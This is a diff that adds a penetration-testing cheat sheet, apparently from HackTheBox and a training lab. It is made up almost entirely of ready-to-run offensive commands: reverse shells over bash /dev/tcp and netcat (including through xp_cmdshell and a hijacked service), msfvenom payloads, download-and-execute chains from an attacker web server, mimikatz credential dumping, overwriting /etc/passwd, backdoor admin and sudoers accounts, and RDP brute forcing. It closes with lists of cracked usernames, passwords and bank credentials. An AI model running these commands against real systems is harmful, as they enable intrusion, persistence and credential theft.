@@ -1,0 +1,189 @@
+=========HachTheBox==============
+Reset Flags: gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include user.txt
+gci -path c:\ -Recurse -ErrorAction SilentlyContinue -include root.txt
+
+==================================================
+
+nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 4 --max-scan-delay 1s --defeat-rst-ratelimit --dns-servers 10.11.1.220,10.11.1.221 --disable-arp-ping --script-args unsafe=1 -oN /root/Documents/Recon/10.11.1.125/scans/10.11.1.125.nmap -oX /root/Documents/Recon/10.11.1.125/scans/10.11.1.125_nmap_scan_import.xml 10.11.1.125
+
+nmap -sT -sU -sV -O -T4 -A -Pn --open --max-retries 4 --max-scan-delay 1s --defeat-rst-ratelimit --dns-servers 10.11.1.220,10.11.1.221 --disable-arp-ping --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv,unsafe=1 -oN /root/Documents/Recon/10.11.1.125/scans/10.11.1.125.nmap -oX /root/Documents/Recon/10.11.1.125/scans/10.11.1.125_nmap_scan_import.xml 10.11.1.125
+
+nmap -sV --script nmap-vulners,vulscan --script-args vulscandb=scipvuldb.csv,unsafe=1 10.11.1.136
+
+5olasa: nmap -Pn -n -v -v -sV -sC 10.10.10.178
+
+Get-ADObject -Filter 'msds-lastknownrdn -eq "TempAdmin"' -IncludeDeletedObjects -Properties cascadeLegacyPwd
+
+Invoke-WebRequest -URI http://10.10.16.121/Tools/CShell.exe -OutFile shell.exe
+
+smbclient '\\10.10.10.178\Users' -c 'prompt OFF;recurse ON;lcd '/root/Documents/HackTheBox/Monteverde/10.10.10.172/loot';mget *' -U 'TempUser'
+
+1> exec xp_cmdshell 'C:\share\nc.exe 10.11.0.38 1234 -e cmd'
+2> go
+
+#####Pivoting########
+
+fuser -k 9050/tcp
+#export PROXYCHAINS_SOCKS5=12345
+ssh -D 9050 root@10.11.1.252 -p 22000 
+
+ssh  -g -L 1234:localhost:143  remote.net
+
+
+#####Kali#######
+crowbar -n 5 -b rdp -s 10.11.1.13/32 -u bob -C '/usr/share/wordlists/rockyou.txt'
+ncrack -vv --user administrator -P '/usr/share/wordlists/rockyou.txt' rdp://10.11.1.7
+wine c:/Python27/python.exe /opt/PyInstaller-2.1/pyinstaller.py --onefile '/root/Desktop/Findings/MS11-080.py' 
+msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.38 LPORT=1234 PrependMigrate=true -f asp > Desktop/Findings/Shell.asp
+
+smbclient '\\10.10.10.182\Data' -c 'prompt OFF;recurse ON;lcd '.';mget *' -U 'r.thompson'
+
+unshadow passwd.txt shadow.txt > passwords.txt
+
+ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
+
+x64 Compile: x86_64-w64-mingw32-gcc Source.c -o File.exe
+x32 Compile: i686-w64-mingw32-gcc Source.c -o File.exe -lws2_32
+
+gcc '/usr/share/exploitdb/exploits/windows/remote/117.c' -o Desktop/Findings/RPC.so
+msfvenom -p windows/shell_reverse_tcp --list-options
+rdesktop 10.11.1.31 -r disk:share=/root/Desktop/Findings
+ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 10.11.1.24 -l username
+
+wget http://10.11.0.42/Tools/whoami && 
+wget http://10.11.0.42/Tools/rootme && 
+wget http://10.11.0.42/Scripts/Linux_LPE_Checker.py && 
+wget http://10.11.0.42/Scripts/Linux_LPE_Checker_2.sh
+
+powershell -command "& { (New-Object Net.WebClient).DownloadFile('http://10.10.16.121/Tools/wget.exe','wget.exe') }" && wget "http://10.10.16.121/Tools/7za.dll" && wget "http://10.10.16.121/Tools/7za.exe" && wget "http://10.10.16.121/Tools/Win.7z" && 7za x Win.7z && cd Win && run.bat
+
+wget http://10.11.0.38/Tools/Linux.tar.xz && tar -xvf Linux.tar.xz && cd Linux && whoami && python Linux_LPE_Checker.py > LPE1.txt && Linux_LPE_Checker_2.sh standard > LPE2.txt && hershell64
+
+powershell -command "& {(New-Object Net.WebClient).DownloadFile('http://10.11.0.42/Tools/PwDump.exe','PwDump.exe')}"
+
+zip2john Desktop/Findings/bank-account.zip > Desktop/Findings/bank-account.txt
+john Desktop/Findings/bank-account.txt
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+
+python -m SimpleHTTPServer 80
+
+#####Linux#######
+scp root@10.11.1.35:/root/* /root/Desktop/Findings/Documentation/10.11.1.35/Loot/
+netstat -ano
+schtasks /query /fo LIST /v
+tasklist /SVC
+uname -a
+bash -i >& /dev/tcp/10.11.0.42/1234 0>&1
+
+cp /usr/bin/ld .
+export PATH=/usr/local/bin:/bin:/usr/bin:/tmp:/usr/sbin
+gcc sendmail.c -o sendmail.so
+
+echo root::0:0:root:/root:/bin/bash > /etc/passwd && su && id
+
+export PATH=$PATH:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/bin:/sbin 
+
+sshpass -p n1nj4W4rri0R! ssh jimmy@10.10.10.171
+
+bash <(wget -qO- http://10.10.16.6/Tools/Linux/Linux_LPE_Checker_2.sh) standard
+bash <(wget -qO- http://10.10.16.6/Tools/linux-exploit-suggester.sh)
+bash <(wget -qO- http://10.10.16.121/Tools/Linux/linpeas.sh)
+python <(wget -qO- http://10.10.16.121/Tools/Linux/Linux_LPE_Checker.py)
+
+perl -pi -e 'exec("id");'
+
+find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \; 2>/dev/null
+
+scp /path/to/file username@a:/path/to/destination
+
+sshuttle -r Hacker@10.11.1.252:22000 10.2.2.0/24
+
+adduser Hacker --force-badname
+passwd Hacker1
+usermod -aG wheel Hacker
+usermod -aG sudo Hacker #add user to sudo group on ubuntu 
+echo 'Hacker  ALL=(ALL:ALL) NOPASSWD:ALL' >> /etc/sudoers #add user to sudoers file
+su Hacker
+
+#####Windows#######
+New-PSSession -Credential (Get-Credential) -ComputerName 10.10.10.182 -Authentication Negotiate 
+Enter-PSSession
+
+.\mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit
+ldapsearch -x -h 10.10.10.182 -D '' -w '' -b "DC=cascade,DC=local"
+systeminfo | findstr OS && wmic OS get OSArchitecture
+query session
+netstat -na | find "LISTENING" | find ":445 "
+shutdown -r -t 01
+net start
+DRIVERQUERY
+accesscheck64.exe -accepteula -uwcqv "Authenticated Users" *
+cd c:\inetpub\wwwroot
+cacls c:\inetpub\wwwroot
+netsh firewall show state
+netsh firewall show config
+
+sc qc upnphost
+sc config upnphost binpath= "c:\inetpub\wwwroot\nc.exe 10.11.0.42 6699 -e cmd.exe"
+sc config upnphost depend= ""
+sc config upnphost obj= ".\LocalSystem" password= ""
+net start upnphost
+
+net user Hacker Hacker1 /add
+net localgroup administrators Hacker /add
+
+put Desktop/Findings/Shell.asp wwwroot/Shell.asp
+
+$env:Path += ";C:\users\mhope\documents"
+
+anonymous
+
+
+
+
+
+
+
+
+
+
+
+
+
+HelpAssistant:0U+0EO4B0DNPBJ
+bob:BOBIS2COOL
+IUSR_BOB:W3268VVW&quot;G`)2F
+IUSR_RALPH:50&quot;RW+JN~88!W&amp;
+IWAM_BOB:G63IMN%S8CRW5B
+IWAM_RALPH:B9PU6]2Z:KR_0F
+Alice:aliceishere
+www:www
+aaron:italia99
+accasia:VA5QRZXo
+bethanyjoy02:vQ2cTpMO
+deanna:marianna
+jpotter:vipsu
+adam:12345
+antony:gamer
+barry:cowboy
+enrico:random
+frank:matrix
+kevin:asdf
+peter:bond007
+robert:august
+william:william
+brett:ilovesecuritytoo @ 10.11.1.220
+patrick:patrick
+ralph:RALPHBOB7
+ASPNET:FGPK/MG4/%0!3(
+
+Banking Accounts Zip Password: alice
+
+Bank	Gold Swiss
+Acct #	2342364-KIETGGE-298074
+SWIDF ID	swisgi
+Reg Username	bobw@acme.local
+Acct Password	3v1lp@ss
